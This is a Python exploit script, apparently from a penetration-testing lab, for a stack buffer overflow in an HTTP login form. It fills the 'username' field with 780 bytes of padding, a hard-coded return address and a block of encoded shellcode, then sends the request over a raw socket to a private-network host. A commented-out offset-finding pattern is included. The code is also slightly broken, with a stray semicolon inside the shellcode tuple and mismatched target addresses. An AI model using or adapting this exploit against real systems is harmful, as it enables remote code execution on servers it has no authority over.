#!/usr/bin/python
import socket
import time
import sys

IP = "127.0.0.1"
PORT = 80




try:
    print(f"\nSending evil buffer with bytes, ")

    filler = "A" * 780
    eip = "\x83\x0C\x09\x10"
    buffer = "C" * 4
    # nops = "\x90" * 10
    shellcode = (1500 - len(filler) - len(eip) - len(buffer)) * "D"



    shellcode = (
        "\xd9\xd0\xd9\x74\x24\xf4\xb8\x7c\xe7\x9d\x39\x5f\x31\xc9\xb1"
        "\x52\x31\x47\x17\x83\xc7\x04\x03\x3b\xf4\x7f\xcc\x3f\x12\xfd"
        "\x2f\xbf\xe3\x62\xb9\x5a\xd2\xa2\xdd\x2f\x45\x13\x95\x7d\x6a"
        "\xd8\xfb\x95\xf9\xac\xd3\x9a\x4a\x1a\x02\x95\x4b\x37\x76\xb4"
        "\xcf\x4a\xab\x16\xf1\x84\xbe\x57\x36\xf8\x33\x05\xef\x76\xe1"
        "\xb9\x84\xc3\x3a\x32\xd6\xc2\x3a\xa7\xaf\xe5\x6b\x76\xbb\xbf"
        "\xab\x79\x68\xb4\xe5\x61\x6d\xf1\xbc\x1a\x45\x8d\x3e\xca\x97"
        "\x6e\xec\x33\x18\x9d\xec\x74\x9f\x7e\x9b\x8c\xe3\x03\x9c\x4b"
        "\x99\xdf\x29\x4f\x39\xab\x8a\xab\xbb\x78\x4c\x38\xb7\x35\x1a"
        "\x66\xd4\xc8\xcf\x1d\xe0\x41\xee\xf1\x60\x11\xd5\xd5\x29\xc1"
        "\x74\x4c\x94\xa4\x89\x8e\x77\x18\x2c\xc5\x9a\x4d\x5d\x84\xf2"
        "\xa2\x6c\x36\x03\xad\xe7\x45\x31\x72\x5c\xc1\x79\xfb\x7a\x16"
        "\x7d\xd6\x3b\x88\x80\xd9\x3b\x81\x46\x8d\x6b\xb9\x6f\xae\xe7"
        "\x39\x8f\x7b\xa7\x69\x3f\xd4\x08\xd9\xff\x84\xe0\x33\xf0\xfb"
        "\x11\x3c\xda\x93\xb8\xc7\x8d\x5b\x94\xb0\xe1\x34\xe7\x3e\xfb"
        "\x7f\x6e\xd8\x91\x6f\x27\x73\x0e\x09\x62\x0f\xaf\xd6\xb8\x6a"
        "\xef\x5d\x4f\x8b\xbe\x95\x3a\x9f\x57\x56\x71\xfd\xfe\x69\xaf"
        "\x69\x9c\xf8\x34\x69\xeb\xe0\xe2\x3e\xbc\xd7\xfa\xaa\x50\x41"
        "\x55\xc8\xa8\x17\x9e\x48\x77\xe4\x21\x51\xfa\x50\x06\x41\xc2"
        "\x59\x02\x35\x9a\x0f\xdc\xe3\x5c\xe6\xae\x5d\x37\x55\x79\x09"
        "\xce\x95\xba\x4f\xcf\xf3\x4c\xaf\x7e\xaa\x08\xd0\x4f\x3a\x9d"
        "\xa9\xad\xda\x62\x60\x76\xea\x28\x28\xdf\x63\xf5\xb9\x5d\xee"
        "\x06\x14\xa1\x17\x85\x9c\x5a\xec\x95\xd5\x5f\xa8\x11\x06\x12"
        "\xa1\xf7\x28\x81\xc2\xdd";
    )

    # print(shellcode)
    inputBuffer = filler + eip + buffer + shellcode
#    inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.121.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: " + str(len(content)) + "\r\n"
    buffer += "\r\n"


    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.172.10", 80))

    s.send(buffer.encode("latin-1"))

    s.close()

    print("Done")

except Exception as e:

    print(e)
    sys.exit()